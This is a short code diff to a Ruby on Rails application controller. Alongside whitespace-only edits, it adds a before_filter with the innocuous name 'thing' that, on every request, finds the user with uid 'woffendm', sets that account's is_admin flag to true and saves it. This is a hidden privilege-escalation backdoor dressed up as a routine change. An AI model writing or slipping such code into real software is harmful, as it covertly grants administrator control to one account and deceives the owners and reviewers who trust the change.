@@ -9,8 +9,14 @@ class ApplicationController < ActionController::Base
   before_filter :load_settings
   before_filter :get_current_user
   helper_method :current_user, :signed_in?
+  before_filter :thing
 
 
+  def thing
+    t=User.find_by_uid("woffendm")
+    t.is_admin = true
+    t.save
+  end
 
   # Loads settings specified in app.yml
   def load_settings
@@ -77,8 +83,8 @@ class ApplicationController < ActionController::Base
       format.json { render :json => {:error => 'Error 500, error...'}, :status => :rejected, :content_type => 'text/plain' }
     end
   end
- 
- 
+  
+  
   # Rescues from invalid record with 404
   rescue_from ActiveRecord::RecordNotFound do |exception|
     respond_to do |format|
@@ -95,8 +101,8 @@ class ApplicationController < ActionController::Base
       format.json { render :json => {:error => 'Error 404, not found...'}, :status => :not_found, :content_type => 'text/plain' }
     end
   end
- 
- 
+  
+  
   # Renders permission denied page
   def render_403
     respond_to do |format|
@@ -104,8 +110,8 @@ class ApplicationController < ActionController::Base
       format.json { render :json => {:error => 'Error 403, forbidden...'}, :status => :forbidden, :content_type => 'text/plain' }
     end
   end
- 
- 
+  
+  
   # Rescues unprocessible entity with 422
   rescue_from ActiveResource::ClientError do |exception|
     respond_to do |format|
